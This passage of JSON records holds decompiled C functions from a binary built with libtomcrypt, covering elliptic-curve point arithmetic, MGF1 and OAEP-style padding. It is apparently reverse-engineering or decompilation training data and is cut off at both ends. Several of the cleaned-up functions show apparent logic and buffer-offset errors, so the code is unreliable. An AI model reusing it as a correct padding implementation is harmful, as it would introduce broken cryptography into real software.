: undefined8\nLocal Variable: local_b8 : undefined8\nLocal Variable: local_c0 : undefined8\nLocal Variable: local_c8 : undefined8"}
{"Function Name": "FUN_0041d640", "Address": "0041d640", "Source Code": "ulong FUN_0041d640(undefined8 *param_1,undefined8 *param_2,long param_3,long param_4)\n{\nundefined8 uVar1;\nuint uVar2;\nint iVar3;\nulong uVar4;\nundefined8 local_38;\nundefined8 local_30;\nif (param_1 == (undefined8 *)0x0) {\nFUN_00410bc0(\"P != NULL\",\"libtomcrypt.c\",0x6623);\n}\nif (param_2 == (undefined8 *)0x0) {\nFUN_00410bc0(\"R != NULL\",\"libtomcrypt.c\",0x6624);\n}\nif (param_3 == 0) {\nFUN_00410bc0(\"modulus != NULL\",\"libtomcrypt.c\",0x6625);\n}\nif (param_4 == 0) {\nFUN_00410bc0(\"mp != NULL\",\"libtomcrypt.c\",0x6626);\n}\nuVar4 = FUN_0041ae70(&local_38,&local_30,0);\nif ((int)uVar4 != 0) {\nreturn uVar4;\n}\nif (param_1 != param_2) {\nuVar2 = (*DAT_00669930)(*param_1,*param_2);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\nuVar2 = (*DAT_00669930)(param_1[1],param_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\nuVar2 = (*DAT_00669930)(param_1[2],param_2[2]);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699d8)(param_2[2],local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(local_38,param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699c8)(param_2[2],param_2[1],param_2[2]);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(param_2[2],param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar1 = param_2[2];\nuVar2 = (*DAT_006699a8)(uVar1,uVar1,uVar1);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669958)(param_2[2],param_3);\nif (iVar3 != -1) {\nuVar2 = (*DAT_006699b8)(param_2[2],param_3,param_2[2]);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699b8)(*param_2,local_38,local_30);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669960)(local_30,0);\nif (iVar3 == -1) {\nuVar2 = (*DAT_006699a8)(local_30,param_3,local_30);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699a8)(local_38,*param_2,local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669958)(local_38,param_3);\nif (iVar3 != -1) {\nuVar2 = (*DAT_006699b8)(local_38,param_3,local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699c8)(local_38,local_30,local_30);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(local_30,param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699a8)(local_30,local_30,local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669958)(local_38,param_3);\nif (iVar3 != -1) {\nuVar2 = (*DAT_006699b8)(local_38,param_3,local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699a8)(local_38,local_30,local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669958)(local_38,param_3);\nif (iVar3 != -1) {\nuVar2 = (*DAT_006699b8)(local_38,param_3,local_38);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar1 = param_2[1];\nuVar2 = (*DAT_006699a8)(uVar1,uVar1,uVar1);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669958)(param_2[1],param_3);\nif (iVar3 != -1) {\nuVar2 = (*DAT_006699b8)(param_2[1],param_3,param_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699d8)(param_2[1],param_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(param_2[1],param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699d8)(param_2[1],local_30);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(local_30,param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669950)(local_30);\nif ((0 < iVar3) &&\n(uVar4 = (*DAT_00669948)(local_30,0), (uVar4 & 1) != 0)) {\nuVar2 = (*DAT_006699a8)(local_30,param_3,local_30);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699e8)(local_30,local_30);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699c8)(param_2[1],*param_2,param_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(param_2[1],param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699d8)(local_38,*param_2);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(*param_2,param_3,param_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699b8)(*param_2,param_2[1],*param_2);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669960)(*param_2,0);\nif (iVar3 == -1) {\nuVar2 = (*DAT_006699a8)(*param_2,param_3,*param_2);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699b8)(*param_2,param_2[1],*param_2);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669960)(*param_2,0);\nif (iVar3 == -1) {\nuVar2 = (*DAT_006699a8)(*param_2,param_3,*param_2)\n;\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699b8)(param_2[1],*param_2,\nparam_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\niVar3 = (*DAT_00669960)(param_2[1],0);\nif (iVar3 == -1) {\nuVar2 = (*DAT_006699a8)(param_2[1],param_3,\nparam_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 != 0) goto LAB_0041d6aa;\n}\nuVar2 = (*DAT_006699c8)(param_2[1],local_38,\nparam_2[1]);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_00669a30)(param_2[1],param_3,\nparam_4);\nuVar4 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = (*DAT_006699b8)(param_2[1],local_30,\nparam_2[1]);\nuVar4 = (ulong)uVar2;\nif ((uVar2 == 0) &&\n(iVar3 = (*DAT_00669960)(param_2[1],0),\niVar3 == -1)) {\nuVar2 = (*DAT_006699a8)(param_2[1],param_3,\nparam_2[1]);\nuVar4 = (ulong)uVar2;\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\nLAB_0041d6aa:\nFUN_0041aff0(local_38,local_30,0);\nreturn uVar4;\n}\nLocal Variable: local_30 : undefined8\nLocal Variable: local_38 : undefined8"}
{"Function Name": "FUN_0041dc80", "Address": "0041dc80", "Source Code": "ulong FUN_0041dc80(undefined8 *param_1,undefined8 *param_2,undefined8 *param_3,long param_4,\nlong param_5)\n{\nuint uVar1;\nint iVar2;\nulong uVar3;\nundefined8 local_60;\nundefined8 local_58;\nundefined8 local_50;\nundefined8 local_48;\nundefined8 local_40 [2];\n\nif (param_1 == (undefined8 *)0x0) {\nFUN_00410bc0(\"P != NULL\",\"libtomcrypt.c\",0x64e7);\n}\nif (param_2 == (undefined8 *)0x0) {\nFUN_00410bc0(\"Q != NULL\",\"libtomcrypt.c\",0x64e8);\n}\nif (param_3 == (undefined8 *)0x0) {\nFUN_00410bc0(\"R != NULL\",\"libtomcrypt.c\",0x64e9);\n}\nif (param_4 == 0) {\nFUN_00410bc0(\"modulus != NULL\",\"libtomcrypt.c\",0x64ea);\n}\nif (param_5 == 0) {\nFUN_00410bc0(\"mp != NULL\",\"libtomcrypt.c\",0x64eb);\n}\nuVar3 = FUN_0041ae70(&local_60,&local_58,&local_50,&local_48,local_40,0);\nif ((int)uVar3 != 0) {\nreturn uVar3;\n}\nuVar1 = (*DAT_006699b8)(param_4,param_2[1],local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669958)(*param_1,*param_2);\nif ((((iVar2 == 0) && (param_2[2] != 0)) && (iVar2 = (*DAT_00669958)(param_1[2]), iVar2 == 0))\n&& ((iVar2 = (*DAT_00669958)(param_1[1],param_2[1]), iVar2 == 0 ||\n(iVar2 = (*DAT_00669958)(param_1[1],local_60), iVar2 == 0)))) {\nFUN_0041aff0(local_60,local_58,local_50,local_48,local_40[0],0);\nuVar3 = FUN_0041d640(param_1,param_3,param_4,param_5);\nreturn uVar3;\n}\nuVar1 = (*DAT_00669930)(*param_1,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(param_1[1],local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(param_1[2],local_40[0]);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nif (param_2[2] != 0) {\nuVar1 = (*DAT_006699d8)(param_2[2],local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_00669a30)(local_60,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_006699c8)(local_60,local_50,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_00669a30)(local_50,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_006699c8)(param_2[2],local_60,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_00669a30)(local_60,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_006699c8)(local_60,local_48,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_00669a30)(local_48,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699d8)(local_40[0],local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_60,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(*param_2,local_60,local_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_58,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(local_40[0],local_60,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_60,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(param_2[1],local_60,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_60,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699b8)(local_48,local_60,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669960)(local_48,0);\nif (iVar2 == -1) {\nuVar1 = (*DAT_006699a8)(local_48,param_4,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699a8)(local_60,local_60,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669958)(local_60,param_4);\nif (iVar2 != -1) {\nuVar1 = (*DAT_006699b8)(local_60,param_4,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699a8)(local_60,local_48,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669958)(local_60,param_4);\nif (iVar2 != -1) {\nuVar1 = (*DAT_006699b8)(local_60,param_4,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699b8)(local_50,local_58,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669960)(local_50,0);\nif (iVar2 == -1) {\nuVar1 = (*DAT_006699a8)(local_50,param_4,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699a8)(local_58,local_58,local_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669958)(local_58,param_4);\nif (iVar2 != -1) {\nuVar1 = (*DAT_006699b8)(local_58,param_4,local_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699a8)(local_58,local_50,local_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669958)(local_58,param_4);\nif (iVar2 != -1) {\nuVar1 = (*DAT_006699b8)(local_58,param_4,local_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nif (param_2[2] != 0) {\nuVar1 = (*DAT_006699c8)(local_40[0],param_2[2],local_40[0]);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\nuVar1 = (*DAT_00669a30)(local_40[0],param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699c8)(local_40[0],local_50,local_40[0]);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_40[0],param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(local_60,local_50,local_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_60,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699d8)(local_50,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_50,param_4,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(local_58,local_50,local_58\n);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_58,param_4,param_5\n);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(local_60,local_50,\nlocal_60);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_60,param_4,\nparam_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699d8)(local_48,local_50)\n;\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_50,param_4\n,param_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699b8)(local_50,\nlocal_58,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669960)(local_50,0);\nif (iVar2 == -1) {\nuVar1 = (*DAT_006699a8)(local_50,param_4,\nlocal_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699b8)(local_58,local_50,\nlocal_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669960)(local_58,0);\nif (iVar2 == -1) {\nuVar1 = (*DAT_006699a8)(local_58,param_4,\nlocal_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699b8)(local_58,local_50,\nlocal_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669960)(local_58,0);\nif (iVar2 == -1) {\nuVar1 = (*DAT_006699a8)(local_58,param_4,\nlocal_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699c8)(local_58,local_48,\nlocal_58);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a30)(local_58,param_4,\nparam_5);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699b8)(local_58,\nlocal_60,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\niVar2 = (*DAT_00669960)(local_48,0);\nif (iVar2 == -1) {\nuVar1 = (*DAT_006699a8)(local_48,param_4,\nlocal_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\niVar2 = (*DAT_00669950)(local_48);\nif ((0 < iVar2) &&\n(uVar3 = (*DAT_00669948)(local_48,0),\n(uVar3 & 1) != 0)) {\nuVar1 = (*DAT_006699a8)(local_48,param_4,\nlocal_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041dd78;\n}\nuVar1 = (*DAT_006699e8)(local_48,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(local_50,*param_3);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(local_48,param_3[1])\n;\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(local_40[0],\nparam_3[2]);\nuVar3 = (ulong)uVar1;\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\nLAB_0041dd78:\nFUN_0041aff0(local_60,local_58,local_50,local_48,local_40[0],0);\nreturn uVar3;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8"}
{"Function Name": "FUN_0041eae0", "Address": "0041eae0", "Source Code": "int FUN_0041eae0(uint input_value, long seed, undefined8 data, undefined *mask, long count)\n{\n    size_t allocation_size; \n    int status_code = 0xb; \n    void *allocated_memory; \n    uint *secondary_memory; \n    ulong loop_index; \n    long casted_param = (long)(int)input_value; \n    \n    if (seed == 0) {\n        FUN_00410bc0(\"seed != NULL\", \"libtomcrypt.c\", 0x69a7); \n    }\n    \n    if (mask == (undefined *)0x0) {\n        FUN_00410bc0(\"mask != NULL\", \"libtomcrypt.c\", 0x69a8); \n    }\n    \n    if ((input_value < 0x100) && (casted_param * 0xd0, (&DAT_0064e5c0)[casted_param * 0x1a] != 0)) {\n        allocation_size = (&DAT_0064e5d0)[casted_param * 0x1a]; \n        allocated_memory = malloc(0x110); \n        secondary_memory = (uint *)malloc(allocation_size); \n        \n        if ((secondary_memory == (uint *)0x0) || (allocated_memory == (void *)0x0)) {\n            \n            if (allocated_memory != (void *)0x0) {\n                free(allocated_memory);\n            }\n            status_code = 0xd; \n            \n            if (secondary_memory != (uint *)0x0) {\n                free(secondary_memory);\n            }\n            return status_code; \n        } else {\n            \n            if (count != 0) {\n                uint loop_control = 0; \n                do {\n                    \n                    *secondary_memory = loop_control >> 0x18 | (loop_control & 0xff0000) >> 8 | (loop_control & 0xff00) << 8 | loop_control << 0x18;\n                    loop_control++; \n                    \n                    status_code = (**(code **)(&DAT_0064e668 + casted_param * 0xd0))(allocated_memory);\n                    if (status_code != 0) goto LAB_0041ec3a; \n                    \n                    status_code = (**(code **)(&DAT_0064e670 + casted_param * 0xd0))(allocated_memory, seed, data);\n                    if (status_code != 0) goto LAB_0041ec3a; \n                    \n                    status_code = (**(code **)(&DAT_0064e670 + casted_param * 0xd0))(allocated_memory, secondary_memory, 4);\n                    if (status_code != 0) goto LAB_0041ec3a; \n                    \n                    status_code = (**(code **)(&DAT_0064e678 + casted_param * 0xd0))(allocated_memory, secondary_memory);\n                    if (status_code != 0) goto LAB_0041ec3a; \n                    \n                    if (count != 0 && allocation_size != 0) {\n                        loop_index = 0; \n                        do {\n                            *mask = *((undefined *)((long)secondary_memory + loop_index)); \n                            mask++; \n                            count--; \n                            loop_index++; \n                            if (allocation_size <= loop_index) break; \n                        } while (count != 0); \n                    }\n                } while (count != 0); \n            }\n        }\n    }\n    status_code = 0; \nLAB_0041ec3a:\n    free(secondary_memory); \n    free(allocated_memory); \n    return status_code; \n}"}
{"Function Name": "FUN_0041ecd0", "Address": "0041ecd0", "Source Code": "int FUN_0041ecd0(char *input_string, size_t input_size, void *output_buffer, undefined8 output_length, ulong data_length,\nuint type_index, void *output_pointer, ulong *output_length_pointer, undefined4 *result_pointer)\n{\n    int return_value; \n    int error_check; \n    void *first_allocation; \n    void *second_allocation; \n    void *third_allocation; \n    size_t size_for_comparison; \n    size_t calculated_size; \n    size_t size_storage[2]; \n    \n    if (input_string == (char *)0x0) {\n        FUN_00410bc0(\"msg != NULL\", \"libtomcrypt.c\", 0x6a17);\n    }\n    \n    if (output_pointer == (void *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6a18);\n    }\n    \n    if (output_length_pointer == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6a19);\n    }\n    \n    if (result_pointer == (undefined4 *)0x0) {\n        FUN_00410bc0(\"res != NULL\", \"libtomcrypt.c\", 0x6a1a);\n    }\n    *result_pointer = 0; \n    \n    if (0xff < type_index || (&DAT_0064e5c0)[(long)(int)type_index * 0x1a] == 0) {\n        return 0xb; \n    }\n    size_for_comparison = (&DAT_0064e5d0)[(long)(int)type_index * 0x1a]; \n    calculated_size = (data_length >> 3) + (ulong)((data_length & 7) != 0); \n    \n    if (calculated_size - 2 <= size_for_comparison * 2 || input_size != calculated_size) {\n        return 0x16; \n    }\n    \n    first_allocation = malloc(input_size);\n    second_allocation = malloc(input_size);\n    third_allocation = malloc(size_for_comparison);\n    \n    if (first_allocation == (void *)0x0 || second_allocation == (void *)0x0 || third_allocation == (void *)0x0) {\n        free(first_allocation); \n        free(second_allocation); \n        free(third_allocation); \n        return 0xd; \n    }\n    \n    if (*input_string != '\\0') {\n        memcpy(third_allocation, input_string + 1, size_for_comparison); \n        calculated_size = (input_size - size_for_comparison) - 1; \n        memcpy(first_allocation, input_string + size_for_comparison + 1, calculated_size); \n        size_storage[0] = input_size; \n        return_value = FUN_0041eae0(type_index, first_allocation, calculated_size, second_allocation, size_for_comparison); \n        if (return_value != 0) goto cleanup; \n        \n        for (size_t iterator = 0; iterator < size_for_comparison; iterator++) {\n            *(byte *)((long)third_allocation + iterator) ^= *(byte *)((long)second_allocation + iterator);\n        }\n        error_check = FUN_0041eae0(type_index, third_allocation, size_for_comparison, second_allocation, calculated_size); \n        if (error_check != 0) goto cleanup; \n        \n        for (size_t iterator = 0; iterator < calculated_size; iterator++) {\n            *(byte *)((long)first_allocation + iterator) ^= *(byte *)((long)second_allocation + iterator);\n        }\n    } else {\n        output_length = 0; \n        output_buffer = first_allocation; \n    }\n    size_storage[0] = input_size; \n    return_value = FUN_0041aa70(type_index, output_buffer, output_length, third_allocation, size_storage); \n    if (return_value != 0) goto cleanup; \n    \n    if (memcmp(third_allocation, first_allocation, size_for_comparison) != 0) {\n        goto cleanup; \n    }\n    size_storage[0] = size_for_comparison; \n    \n    if (size_for_comparison < calculated_size && *(char *)((long)first_allocation + size_for_comparison) == '\\0') {\n        size_t iterator = size_for_comparison + 1; \n        \n        while (calculated_size != iterator && *(char *)((long)first_allocation + iterator) == '\\0') {\n            iterator++;\n        }\n        size_storage[0] = iterator; \n        \n        if (*(char *)((long)first_allocation + iterator) == '\\x01') {\n            size_storage[0] = iterator + 1; \n            calculated_size -= size_storage[0]; \n            \n            if (*output_length_pointer < calculated_size) {\n                *output_length_pointer = calculated_size; \n                return_value = 6; \n            } else {\n                *output_length_pointer = calculated_size; \n                memcpy(output_pointer, (void *)((long)first_allocation + size_storage[0]), calculated_size); \n                *result_pointer = 1; \n                return_value = error_check; \n            }\n            goto cleanup; \n        }\n    } else if (size_for_comparison != calculated_size) {\n        goto cleanup; \n    }\n    return_value = 7; \ncleanup:\n    free(third_allocation); \n    free(second_allocation); \n    free(first_allocation); \n    return return_value; \n}"}
{"Function Name": "FUN_0041f1d0", "Address": "0041f1d0", "Source Code": "int FUN_0041f1d0(void *param_1, ulong param_2, void *param_3, undefined8 param_4, ulong param_5,\nundefined8 param_6, uint param_7, uint param_8, undefined *param_9, ulong *param_10)\n{\n    size_t size_based_on_param8; \n    size_t size_based_on_param5; \n    int return_status; \n    void *allocated_memory_ptr1; \n    void *allocated_memory_ptr2; \n    void *allocated_memory_ptr3; \n    size_t remaining_size; \n    size_t loop_index; \n    long unused_variable; \n    size_t local_size_array[2]; \n    \n    if (param_1 == (void *)0x0) {\n        FUN_00410bc0(\"msg != NULL\", \"libtomcrypt.c\", 0x6ad5); \n    }\n    \n    if (param_9 == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6ad6); \n    }\n    \n    if (param_10 == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6ad7); \n    }\n    \n    if (0xff < param_8 || (&DAT_0064e5c0)[(long)(int)param_8 * 0x1a] == 0) {\n        return 0xb; \n    }\n    \n    if (0xff < param_7 || (&DAT_006495c0)[(long)(int)param_7 * 10] == 0) {\n        return 0xc; \n    }\n    \n    size_based_on_param8 = (&DAT_0064e5d0)[(long)(int)param_8 * 0x1a];\n    \n    size_based_on_param5 = (ulong)((param_5 & 7) != 0) + (param_5 >> 3);\n    \n    if (size_based_on_param5 - 2 <= size_based_on_param8 * 2 || size_based_on_param5 - 2 + -2 < param_2) {\n        return 0x16; \n    }\n    \n    allocated_memory_ptr1 = malloc(size_based_on_param5);\n    \n    allocated_memory_ptr2 = malloc(size_based_on_param5);\n    \n    allocated_memory_ptr3 = malloc(size_based_on_param8);\n    \n    if ((allocated_memory_ptr2 == (void *)0x0) || (allocated_memory_ptr1 == (void *)0x0)) {\n        if (allocated_memory_ptr1 == (void *)0x0) goto LAB_0041f4d3; \n    } else if (allocated_memory_ptr3 != (void *)0x0) {\n        \n        if (param_3 == (void *)0x0) {\n            param_4 = 0; \n            param_3 = allocated_memory_ptr1; \n        }\n        local_size_array[0] = size_based_on_param5; \n        \n        return_status = FUN_0041aa70(param_8, param_3, param_4, allocated_memory_ptr1, local_size_array);\n        if (return_status == 0) {\n            \n            remaining_size = (size_based_on_param8 * -2 + -2 - param_2) + size_based_on_param5;\n            \n            memset((void *)((long)allocated_memory_ptr1 + size_based_on_param8), 0, remaining_size);\n            *(undefined *)((long)allocated_memory_ptr1 + remaining_size + size_based_on_param8 + 1) = 1; \n            return_status = 9; \n            \n            memcpy((void *)((long)allocated_memory_ptr1 + remaining_size + size_based_on_param8 + 1), param_1, param_2);\n            local_size_array[0] = param_2 + remaining_size + size_based_on_param8 + 1; \n            \n            remaining_size = (*(code *)(&DAT_006495e8)[(long)(int)param_7 * 10])(allocated_memory_ptr3, size_based_on_param8, param_6);\n            if (remaining_size == size_based_on_param8) {\n                size_t __n = (size_based_on_param5 - size_based_on_param8) - 1; \n                \n                return_status = FUN_0041eae0(param_8, allocated_memory_ptr3, size_based_on_param8, allocated_memory_ptr2, __n);\n                if (return_status == 0) {\n                    \n                    for (loop_index = 0; loop_index < __n; loop_index++) {\n                        *(byte *)((long)allocated_memory_ptr1 + loop_index) ^= *(byte *)((long)allocated_memory_ptr2 + loop_index);\n                    }\n                }\n                \n                return_status = FUN_0041eae0(param_8, allocated_memory_ptr1, __n, allocated_memory_ptr2, remaining_size);\n                if (return_status == 0) {\n                    \n                    for (loop_index = 0; loop_index < remaining_size; loop_index++) {\n                        *(byte *)((long)allocated_memory_ptr3 + loop_index) ^= *(byte *)((long)allocated_memory_ptr2 + loop_index);\n                    }\n                    \n                    if (*param_10 < size_based_on_param5) {\n                        return_status = 6; \n                        *param_10 = size_based_on_param5; \n                    } else {\n                        